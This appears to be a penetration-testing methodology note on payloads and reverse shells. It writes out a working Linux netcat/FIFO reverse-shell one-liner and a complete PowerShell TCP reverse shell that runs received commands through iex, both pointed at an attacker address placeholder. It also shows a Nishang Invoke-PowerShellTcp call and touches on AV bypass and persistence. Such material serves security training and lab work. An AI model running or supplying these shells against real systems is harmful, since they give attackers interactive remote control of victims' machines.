# Payloads and Shells Methodology

Payloads are commands or code that **exploit a vulnerability** or perform **malicious actions** on a target system. The selection of a payload is primarily determined by the **target OS**, available **interpreters** (like Bash or PowerShell), and **programming languages**.

## Linux Netcat/Bash Reverse Shell

This technique utilizes a **FIFO named pipe** to establish a bidirectional communication channel between the target's Bash shell and an attacker's Netcat listener.

### Operational Workflow

1. **Prepare the environment**: Remove any existing files at the intended pipe location to prevent conflicts.
2. **Create a communication channel**: Establish a FIFO named pipe to facilitate the data flow.
3. **Execute the shell**: Launch an interactive Bash shell that redirects both standard output and standard error to the network socket.
4. **Establish the connection**: Use Netcat to connect back to the attack machine, completing the reverse shell circuit.

### Command Reference: Linux Reverse Shell One-Liner

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <ATTACK_IP> <PORT> > /tmp/f
```

|Component|Purpose|Attack Implication|
|:--|:--|:--|
|`rm -f /tmp/f;`|Removes `/tmp/f` if it exists; `-f` ignores non-existent files.|Ensures a clean state for the named pipe.|
|`mkfifo /tmp/f;`|Creates a **FIFO named pipe** at `/tmp/f`.|Enables the redirect of command output back into the shell input.|
|`cat /tmp/f \|`|Concatenates the pipe and sends output to the next command.|
|`/bin/bash -i`|Executes an **interactive** Bash shell.|Provides the attacker with a functional command-line interface.|
|`2>&1`|Redirects standard error (2) to standard output (1).|Ensures the attacker sees error messages in the shell.|
|`nc <ATTACK_IP> <PORT>`|Connects to the attacker's listening socket.|Initiates the outbound connection to bypass inbound firewall rules.|
|`> /tmp/f`|Redirects Netcat's output back into the named pipe.|Completes the loop, sending attacker commands from Netcat into Bash.|

---

## Windows PowerShell Reverse Shell

This one-liner is designed for execution within `cmd.exe` to trigger a PowerShell-based reverse shell. It is useful when **Remote Code Execution (RCE)** is discovered on a Windows host.

### Command Reference: PowerShell One-Liner

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACK_IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Parameter Breakdown

|Parameter/Method|Function|Context/Why it Matters|
|:--|:--|:--|
|`powershell -nop -c`|Executes PowerShell with **no profile** (`-nop`) and runs the command block (`-c`).|Skips user profiles to increase speed and avoid potential interference or detection.|
|`TCPClient`|Creates a .NET object to connect to the specified socket.|Handles the network transport layer for the shell.|
|`GetStream()`|Facilitates the network communication stream.|Allows reading and writing data over the established connection.|
|`iex`|Alias for **Invoke-Expression**.|**Critical**: Executes the strings received over the network as local commands.|
|`2>&1 \|Out-String`|Redirects errors to output and converts objects to strings.|
|`(pwd).Path`|Appends the current working directory to the output.|Mimics a real prompt (e.g., `PS C:\>`) so the attacker knows their location.|

---

## Script-Based Payloads (Nishang)

When a one-liner is insufficient, pre-built scripts like those from the **Nishang project** provide more robust options.

### Invoke-PowerShellTcp

This script can be used for both **Reverse** and **Bind** interactive shells.

- **Reverse Shell**: Used when the target must initiate the connection to the attacker.
- **Bind Shell**: Used when the attacker connects directly to a port listening on the target.
- **IPv6 Support**: Capable of establishing connections over IPv6 addresses.

**Example Usage (Reverse):**

```
Invoke-PowerShellTcp -Reverse -IPAddress <ATTACK_IP> -Port <PORT>
```

---

## Payload Selection Considerations

- **Detection**: Windows Defender or other AV may block execution if the code is recognized as malicious. Understanding payload internals helps in identifying what needs to be modified for **AV bypass**.
- **Automation**: Frameworks like **Metasploit** can generate pre-packaged/automated payloads to obtain shells without manual command construction.
- **Persistence**: Once executed, these commands provide instructions to the target computer to maintain the connection.